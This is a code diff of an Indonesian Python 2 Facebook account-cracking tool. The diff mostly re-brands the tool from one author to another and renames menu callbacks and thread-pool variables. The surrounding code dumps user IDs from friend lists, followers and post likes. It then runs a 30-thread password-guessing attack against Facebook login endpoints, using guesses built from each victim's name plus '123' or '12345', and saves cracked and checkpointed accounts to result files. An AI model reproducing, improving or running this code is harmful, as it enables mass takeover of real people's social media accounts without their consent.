@@ -244,11 +244,11 @@ def teman(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));reza_xd()
     except (KeyError,IOError):
         os.remove(cin)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 '''
 																																																				csy = 'Cindy sayang Yayan'
 																																																				ysc = 'Yayan sayang Cindy'
@@ -276,11 +276,11 @@ def publik(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));reza_xd()
     except (KeyError,IOError):
         os.remove(knt)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -305,11 +305,11 @@ def followers(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));reza_xd()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 
 # dump id dari postingan hehe
 def postingan(kontol):
@@ -334,11 +334,11 @@ def postingan(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));reza_xd()
     except (KeyError,IOError):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 #cek ingfo
 def cek_ingfo(kontol):
     try:
@@ -478,13 +478,13 @@ def cek_ingfo(kontol):
 def info_tools():
     os.system('clear')
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
-    print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Website  : https://www.yayanxd.my.id'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Yt       : Reja Gaming'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Author   : Reza Alfauzan Ganteng.'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Github   : https://github.com/Reaper-XD'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Facebook : https://www.facebook.com/ReaperXD277'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/ReaperXD277'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Instagram: https://www.instagram.com/ferdik_reza'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Website  : https://www.pointblank.id'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
     raw_input('\n  [ %sKEMBALI%s ] '%(O,N));reza_xd()
 
@@ -503,7 +503,7 @@ def seting_yntkts():
         except IOError:
             user_agent = '%s-'%(M)
         print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
-        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));reza_xd()
     else:
         print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
 # User Agent baru
@@ -558,11 +558,11 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RezaGanteng(max_workers=30) as (__rezaXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
+                                        __rezaXD__.submit(self.__api__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -571,11 +571,11 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RezaGanteng(max_workers=30) as (__rezaXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
+                                        __rezaXD__.submit(self.__mbasic__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -584,11 +584,11 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RezaGanteng(max_workers=30) as (__rezaXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
+                                        __rezaXD__.submit(self.__mfb,__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -772,7 +772,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
+            with RezaGanteng(max_workers=30) as (__rezaXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         name, uid = yntkts.split('<=>')
@@ -781,7 +781,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__api__, uid, pwx)
+                        __rezaXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
 
@@ -791,7 +791,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
+            with RezaGanteng(max_workers=30) as (__rezaXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         name, uid = yntkts.split('<=>')
@@ -800,7 +800,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
+                        __rezaXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
 
@@ -810,7 +810,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
+            with RezaGanteng(max_workers=30) as (__rezaXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         name, uid = yntkts.split('<=>')
@@ -819,7 +819,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mfb__, uid, pwx)
+                        __rezaXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
 
